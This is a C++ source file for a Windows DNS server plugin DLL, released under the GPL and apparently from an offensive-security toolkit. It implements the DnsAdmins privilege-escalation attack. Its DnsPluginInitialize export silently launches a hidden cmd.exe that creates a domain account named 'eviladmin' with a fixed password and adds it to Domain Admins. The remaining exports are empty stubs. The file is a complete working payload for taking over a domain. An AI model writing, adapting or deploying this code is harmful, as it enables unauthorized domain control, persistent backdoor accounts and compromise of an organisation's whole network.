/*
 * Copyright (c) 2020 Reigning Shells. All Rights Reserved.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "pch.h"

extern "C" __declspec(dllexport)
DWORD WINAPI DnsPluginInitialize(
	PVOID pDnsAllocateFunction,
	PVOID pDnsFreeFunction)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	wchar_t cmd[] = L"cmd.exe /c net user eviladmin SuperS3cr3t! /add /domain && net group \"domain admins\" eviladmin /add /domain";

	if (CreateProcess(NULL,
		cmd, 
		NULL, 
		NULL, 
		FALSE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi))
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
	}

	return ERROR_SUCCESS;
}

extern "C" __declspec(dllexport)
DWORD WINAPI DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

extern "C" __declspec(dllexport)
DWORD WINAPI DnsPluginQuery(
	PSTR pszQueryName,
	WORD wQueryType,
	PSTR pszRecordOwnerName,
	PVOID *ppDnsRecordListHead)
{
	return ERROR_SUCCESS;
}